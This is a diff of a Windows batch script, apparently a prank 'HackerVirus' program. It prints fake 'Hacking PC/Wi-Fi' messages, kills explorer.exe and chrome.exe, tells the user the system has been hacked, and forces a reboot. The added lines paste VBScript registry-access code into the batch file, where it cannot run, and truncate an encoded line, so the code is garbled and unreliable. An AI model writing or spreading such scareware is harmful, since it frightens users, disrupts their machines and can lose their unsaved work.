@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFDlbSB2DAE+1BaAR7ebv/Navo04WFNEwdYrU1LHJM6Aj6QvmdIJj02Jf+A==
+::Zh4grVQjdCyDJGyX8VAjFDlbSB2DAE+1BaAR7ebv/Navo04WFNEwdYrU1LHJM6Aj6QvmdIJN
 ::YB416Ek+ZG8=
 ::
 ::
@@ -40,8 +40,20 @@ echo Hacking PC...
 echo Hacking Wi-Fi.
 echo Hacking Wi-Fi..
 echo Hacking Wi-Fi...
+Option Explicit
+'~ On Error Resume Next
+RequireAdmin
+
+Dim objReg
+Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
 echo Done
 taskkill /f /im explorer.exe
 echo Your system has been hacked by HackerVirus
 echo Bye
 shutdown 0 /a
+pause
+pause
+shutdown 0 /r
+shutdown /r 0
+exit
+taskkill /f /im chrome.exe
